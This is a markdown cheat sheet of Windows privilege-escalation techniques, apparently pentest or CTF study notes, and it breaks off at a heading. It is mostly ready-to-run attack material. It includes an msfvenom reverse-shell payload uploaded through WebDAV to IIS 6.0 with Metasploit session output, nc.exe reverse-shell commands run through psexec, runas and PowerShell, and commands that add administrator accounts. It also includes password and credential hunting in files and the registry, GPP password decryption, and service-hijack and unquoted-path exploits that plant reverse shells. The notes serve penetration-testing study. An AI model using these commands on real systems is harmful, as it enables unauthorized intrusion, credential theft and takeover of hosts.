# Windows Privilege Escalation

### Resources
- http://www.fuzzysecurity.com/tutorials/16.html
- Metasploit meterpreter privilege escalation guide https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/

### Enumeration
- `net user "%username"`
- try the `getsystem` command in meterpreter, rarely works but worth a shot: `meterpreter > getsystem`

- Generating a quick report without file upload
```
@echo --------- BASIC WINDOWS RECON ---------  > report.txt
timeout 1
net config Workstation  >> report.txt
timeout 1
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> report.txt
timeout 1
hostname >> report.txt
timeout 1
net users >> report.txt
timeout 1
ipconfig /all >> report.txt
timeout 1
route print >> report.txt
timeout 1
arp -A >> report.txt
timeout 1
netstat -ano >> report.txt
timeout 1
netsh firewall show state >> report.txt
timeout 1
netsh firewall show config >> report.txt
timeout 1
schtasks /query /fo LIST /v >> report.txt
timeout 1
tasklist /SVC >> report.txt
timeout 1
net start >> report.txt
timeout 1
DRIVERQUERY >> report.txt
timeout 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
timeout 1
dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
timeout 1
findstr /si password *.xml *.ini *.txt >> report.txt
timeout 1
reg query HKLM /f password /t REG_SZ /s >> report.txt
timeout 1
reg query HKCU /f password /t REG_SZ /s >> report.txt
timeout 1
dir "C:\"
timeout 1
dir "C:\Program Files\" >> report.txt
timeout 1
dir "C:\Program Files (x86)\"
timeout 1
dir "C:\Users\"
timeout 1
dir "C:\Users\Public\"
timeout 1
echo REPORT COMPLETE!
```

- Exploiting Windows Server 2003 and IIS 6.0 WEBDAV :
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

 cadavar http://$ip
 dav:/> put aspshell.txt
 Uploading aspshell.txt to `/aspshell.txt':
 Progress: [=============================>] 100.0% of 38468 bytes succeeded.
 dav:/> copy aspshell.txt aspshell3.asp;.txt
 Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
 dav:/> exit

 msf > use exploit/multi/handler
 msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
 msf exploit(handler) > set LHOST 1.2.3.4
 msf exploit(handler) > set LPORT 80
 msf exploit(handler) > set ExitOnSession false
 msf exploit(handler) > exploit -j

 curl http://$ip/aspshell3.asp;.txt

 [*] Started reverse TCP handler on 1.2.3.4:443
 [*] Starting the payload handler...
 [*] Sending stage (957487 bytes) to 1.2.3.5
 [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700
 ```

- to compile the python exploits using `PyInstaller`
 ```bash
 pip install pyinstaller
 wget -O exploit.py http://www.exploit-db/download/31853
 python pyinstaller.py --onefile exploit.py
 ```

- Windows Server 2003 and IIS 6.0 privilege escalation using Impersonation |  
Links: https://www.exploit-db.com/exploits/6705/ | https://github.com/Re4son/Churrasco

  ```
  c:\Inetpub>churrasco
  churrasco
  /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

  c:\Inetpub>churrasco -d "net user /add <username> <password>"
  c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
  c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"
  ```

- Compiling MS11-080
```
python pyinstaller.py --onefile ms11-080.py
ms11-080.exe -O XP
```

- Executing a powershell script
```
powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
```

- Powershell Privilege Escalation Tools https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

- **Running a command as a different user in Windows**
  - Sysinternals psexec
    - Prerequisites : username, password, nc.exe
    ```
    C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
    PsExec v2.2 - Execute processes remotely
    Copyright (C) 2001-2016 Mark Russinovich
    Sysinternals - www.sysinternals.com
    ```

  - Runas.exe
    - Prequisites : username, password
    ```
    C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
    Enter the password for Test:
    Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
    ```

  - Powershell script
    - Prequisites : powershell, username, password
    ```
    $username = '<username here>'
    $password = '<password here>'
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
    Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
    ```
    Then run this script using powershell.exe: </br>
    `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`


- Windows Service Configuration Viewer - Checks for misconfigurations in services that can lead to privilege escalation.
```
icacls scsiaccess.exe
scsiaccess.exe  
NT AUTHORITY\SYSTEM:(I)(F)  
BUILTIN\Administrators:(I)(F)  
BUILTIN\Users:(I)(RX)  
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
Everyone:(I)(F)
```

- Compile a custom add user command in windows using C
```
root@kali:~# cat useradd.c  
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
int main ()  
{  
int i;  
i=system ("net localgroup administrators low /add");  
return 0;  
}
```
`i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`

- Group Policy Preferences (GPP)
Found in modern domain environments

  - map the Domain Controller SYSVOL share </br>
  `net use z:\\dc01\SYSVOL`

  - Find the GPP file: Groups.xml
  `dir /s Groups.xml`

  - Review the contents for passwords
  `type Groups.xml`

  - Decrypt using GPP Decrypt
  `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`

- Find and display the proof.txt or flag.txt
```
meterpreter > run post/windows/gather/win_privs
meterpreter > cd\ & dir /b /s flag.txt
meterpreter > type c:\path-to\flag.txt
````

----------------------------------------------------------------------------------------

# Part - 2

### User accounts 

- User accounts are used to log into a Windows system.
- Collection of settings/preferences bound to a unique identity
 
### Service accounts 

- Service accounts are used to run services on Windows
- These can't be used to sign into a Windows system
- SYSTEM account is a default service account which has the **highest privilege** of any local account in Windows
- Other local service accounts include: NETWORK SERVICE, LOCAL SERVICE

### Groups 

- User accounts can belong to multiple groups and groups can have multiple users
- Groups allow for easier access control to resources
- Regular groups (Administrators, Users) have a set list of members
- Pseudo groups (Authenticated Users) have a dynamic list of members, which changes based on certain conditions

### ACLs & ACEs 

- Permissions to control a certain resource in Windows are controlled by the access control list (ACL) for that resource
- Each ACL is made up of zero or more access control entries (ACEs)
- Each ACE defines the relationship between a principal(user, group) and a certain access right

### RDP is present/can be enabled

- If RDP is available or can be enabled we can add our low privileged user to the administrators group and then spawn an administrator command prompt via the GUI

### Admin -> SYSTEM

- To escalate from Administrator to SYSTEM privileges, PsExec tool from Windows Sysinternals can be used : https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

### PowerUp and SharpUp 

- Tools that hunt for specific privilege escalation misconfigurations
```
# start checking for common privilege escalation misconfigurations 
PS> . .\PowerUp.ps1
PS> Invoke-AllChecks
```

### WinPEAS

```
# Before running the script we need to add a registry key and then reopen the command prompt
> reg add HKCU\Console /v VirtualTerminalLevel/t REG_DWORD /d 1

# running all checks while avoiding time-consuming searches
> .\winPEASany.exe quiet cmd fast

# running specific check categories 
> .\winPEASany.exe quiet cmd systeminfo
```

### accesschk.exe

- accesschk.exe is a tool for checking user access control rights
- can be used to check if a user or group has access to files, directories, services and registry keys


### Kernel 

- Core of the operating system 
- Layer between application software and the actual computer hardware
- Kernel has complete control over the operating system, so exploiting a kernel vulnerability can result in execution as the SYSTEM user

### Privilege Escalation Steps for Windows 7

- Extract the output of the systeminfo command 
```
> systeminfo > systeminfo.txt
```
- Run `wesng` to find potential exploits
```
python wesng.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only | less
```
- Cross reference results with compiled exploits 
- Download the compiled exploit to the Windows VM
- Start a listener on attacking machine and run the exploit providing it with the reverse shell executable which should run with SYSTEM privileges
```
> .\exploit.exe C:\PrivEsc\reverse.exe
```

### Services 

- These are simply programs that run in the background, accepting input or performing regular tasks
- If services run with SYSTEM privileges are misconfigured, exploiting them may lead to command execution with SYSTEM privileges

### Service commands

```
# query the configuration of a service
> sc.exe qc <name> 

# query the current status of a service
> sc.exe query <name>

# modify a configuration option of a service 
> sc.exe config <name> <option>=<value>

# start/stop a service 
> net start/stop <name>
```

### Service Miconfigurations 

1. Insecure Service Properties 
2. Unquoted Service Path
3. Weak registry permissions 
4. Insecure service executables 
5. DLL Hijacking

#### Insecure Service Properties
- Each service has an ACL which defines certain service-specific permissions 
- Some permissions are innocuos(SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS), some may be useful(SERVICE_STOP), some are dangerous(SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG)

- **Potential Rabbit Hole** : If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges.

  - **Privilege Escalation Example** 
  ```
  # 1. Run winPEAS to check for service misconfigurations 
  > .\winpeas.exe quiet servicesinfo

  # 2. We can modify the "daclsvc" service
  # 3. We can confirm this with accesschk.exe
  > .\accesschk.exe /accepteula -uwcqv user daclsvc

  # 4. Check the current configuration of the service
  > sc qc daclsvc

  # 5. Check the current status of the service 
  > sc query daclsvc

  # 6. Reconfigure the service to user our reverse shell executable
  > sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""

  # 7. Start a listener on attacking machine and then start the service to trigger the exploit 
  > net start daclsvc
  ```

#### Unquoted Service Path

**Example:**

- the command `C:\Program Files\Some Dir\SomeProgram.exe` can be interpreted in two ways 
  1. the execution of SomeProgram.exe
  2. C:\Program being an executable with arguments Files\Some and Dir\SomeProgram.exe

- Windows checks each possibility in turn
- **If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead


- **Privilege Escalation Example** 
```
# 1. Run winPEAS to check for service misconfigurations
> .\winpeas.exe quiet servicesinfo

# 2. unquotedsvc service has an unquoted path that also contains spaces: 
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

# 3. confirm this using sc: 
> sc qc unquotedsvc

# 4. use accesschk.exe to check for write permissions 
> .\accesschk.exe /accepteula -uwdq C:\
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
> .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

# 5. Copy the reverse shell executable and rename it appropriately
> copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

# 6. start a listener on attacking machine and then start the service to trigger the exploit 
> net start unquotedsvc
```

#### Weak Registry Permissions
